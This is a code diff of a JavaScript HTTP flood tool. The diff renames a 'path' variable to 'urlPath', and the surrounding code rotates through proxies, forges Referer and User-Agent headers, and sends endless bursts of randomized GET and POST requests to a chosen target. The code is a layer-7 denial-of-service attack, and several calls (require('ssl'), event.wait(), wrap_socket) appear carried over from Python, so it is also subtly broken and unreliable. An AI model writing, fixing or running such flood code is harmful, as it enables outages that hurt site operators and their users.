@@ -1,11 +1,11 @@
 const socks = require('socks');
 const fs = require('fs');
-const path = require('path');
+const nodePath = require('path'); 
 const { randomInt, randomBytes } = require('crypto');
 const ssl = require('ssl');
 
 let target = "";
-let path = "/";
+let urlPath = "/"; 
 let port = 80;
 let protocol = "http";
 let proxies = [];
@@ -100,13 +100,13 @@ function GenReqHeader(method) {
   if (method === "get" || method === "head") {
     const connection = "Connection: Keep-Alive\r\n";
     const accept = acceptall[randomInt(0, acceptall.length - 1)];
-    const referer = `Referer: ${referers[randomInt(0, referers.length - 1)]}${target}${path}\r\n`;
+    const referer = `Referer: ${referers[randomInt(0, referers.length - 1)]}${target}${urlPath}\r\n`;
     const useragent = `User-Agent: ${getuseragent()}\r\n`;
     header = referer + useragent + accept + connection + "\r\n";
   } else if (method === "post") {
-    const post_host = `POST ${path} HTTP/1.1\r\nHost: ${target}\r\n`;
+    const post_host = `POST ${urlPath} HTTP/1.1\r\nHost: ${target}\r\n`;
     const content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n";
-    const refer = `Referer: http://${target}${path}\r\n`;
+    const refer = `Referer: http://${target}${urlPath}\r\n`;
     const user_agent = `User-Agent: ${getuseragent()}\r\n`;
     const accept = acceptall[randomInt(0, acceptall.length - 1)];
     if (data === "") data = randomBytes(16).toString('hex');
@@ -139,14 +139,14 @@ function ParseUrl(original_url) {
   }
   target = check[0];
   if (tmp.length > 1) {
-    path = url.replace(website, "", 1);
+    urlPath = url.replace(website, "", 1); 
   }
 }
 
 function cc(event, proxy_type) {
   const header = GenReqHeader("get");
   const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
-  const add = path.includes("?") ? "&" : "?";
+  const add = urlPath.includes("?") ? "&" : "?";
   event.wait();
   while (true) {
     let s = null;
@@ -162,7 +162,7 @@ function cc(event, proxy_type) {
         s = ctx.wrap_socket(s, { serverHostname: target });
       }
       for (let i = 0; i < 100; i++) {
-        const get_host = `GET ${path}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
+        const get_host = `GET ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
         const request = get_host + header;
         s.send(request);
       }
